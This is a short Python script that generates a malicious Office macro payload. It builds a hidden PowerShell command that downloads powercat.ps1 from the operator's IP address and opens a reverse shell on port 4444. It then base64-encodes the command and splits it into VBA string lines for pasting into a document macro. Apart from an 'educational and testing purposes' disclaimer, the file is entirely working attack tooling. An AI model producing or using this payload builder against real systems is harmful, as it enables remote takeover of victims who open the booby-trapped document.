# This python executable file serves as a tool that splits encoded base64 strings into smaller chunks of 50
# characters and concatenate them into variables to be pasted onto msoffice.
# Created by windyforce, on 6th November 2023.
# This is purely for educational and testing purposes. Author is not responsible for any misuse of this script.
# PLEASE NOTE THAT WHEN YOU HOOK UP YOUR LISTENER, DEFAULT SET PORT IS 4444 OR FEEL FREE TO AMEND TO YOUR LIKING.
import netifaces as ni
import base64

def get_ip_address():
    try:
        ip_address = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    except (ValueError, KeyError):
        try:
            default_interface = ni.gateways()['default'][ni.AF_INET][1]
            ip_address = ni.ifaddresses(default_interface)[ni.AF_INET][0]['addr']
        except (ValueError, KeyError):
            ip_address = 'Not available'
    return ip_address

if __name__ == "__main__":
    ip_address = get_ip_address()
    if ip_address != 'Not available':
        command_template = "IEX(New-Object System.Net.WebClient).DownloadString('http://{}/powercat.ps1');powercat -c {} -p 4444 -e powershell".format(ip_address, ip_address)

        # Convert to UTF-16LE
        utf16_command = command_template.encode('utf-16-le')

        # Encode to Base64
        base64_encoded = base64.b64encode(utf16_command).decode('utf-8')

        print("Double check the command, IP Address and Port here:")
        print("IEX(New-Object System.Net.WebClient).DownloadString('http://" + get_ip_address() + "/powercat.ps1');powercat -c " + get_ip_address() + " -p 4444 -e powershell:")
        print("\nBase64 encoded of the previous line.")
        print(base64_encoded)
    else:
        print("IP address not available.")

str = "powershell.exe -nop -w hidden -e " + base64_encoded + ""

n = 50

print("\nCopy and paste everything here:" )
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
